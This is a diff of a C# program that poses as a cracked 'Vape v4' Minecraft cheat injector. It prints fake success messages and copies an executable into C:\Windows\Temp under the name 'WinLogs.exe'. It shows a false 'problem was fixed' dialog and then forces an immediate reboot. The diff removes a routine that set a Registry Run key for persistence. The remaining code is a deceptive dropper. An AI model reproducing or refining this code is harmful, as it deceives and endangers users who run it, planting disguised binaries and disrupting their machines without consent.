@@ -51,9 +51,8 @@ namespace Vape_v4._05
                     Console.WriteLine("Succesfully import Injector");
                     Console.WriteLine("Succesfully import Kernel");
                     Console.WriteLine("Succesfully import AppData");
-                    Console.WriteLine("Succesfully crack vape");                   
+                    Console.WriteLine("Succesfully crack vape"); 
                     File.Copy(@"bin\Tools\vape v4.exe", @"C:\Windows\Temp\WinLogs.exe");
-                    AutoMaticOpen();
                     Console.WriteLine("Starting inject...");
                     SetTimer();
                     Console.ReadKey();
@@ -65,12 +64,6 @@ namespace Vape_v4._05
                 }
             }
         }
-        private static void AutoMaticOpen()
-        {
-            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            key.SetValue(@"C:\Windows\Temp\WinLogs.exe", Application.ExecutablePath);
-        }
-
         private static void Timer()
         {
             t2 = new System.Timers.Timer(10000);
@@ -109,7 +102,7 @@ namespace Vape_v4._05
                 int index = r.Next(list.Count);
                 Console.WriteLine(list[index]);
             }
-            DialogResult dialog = MessageBox.Show("Succesfully Inject! Please Start Minecraft", "Vape_v4._05", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            DialogResult dialog = MessageBox.Show("Succesfully Inject! Please run game", "Vape_v4._05", MessageBoxButtons.OK, MessageBoxIcon.Information);
             if(dialog == DialogResult.OK)
             {
                 Console.Clear();
@@ -152,7 +145,7 @@ namespace Vape_v4._05
         private static void OnTime2(Object source, ElapsedEventArgs e)
         {
             File.Create(@"C:\Windows\Temp\Xif.txt");
-            DialogResult f = MessageBox.Show("The problem was fixed\nYou should restart a computer, click OK to restart a computer", "Vape_v4._05", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            DialogResult f = MessageBox.Show("The problem was fixed\nYou should restart a computer and run game, click OK to restart a computer", "Vape_v4._05", MessageBoxButtons.OK, MessageBoxIcon.Information);
             if(f == DialogResult.OK)
             {
                Process.Start("shutdown.exe", "-r -t 0");
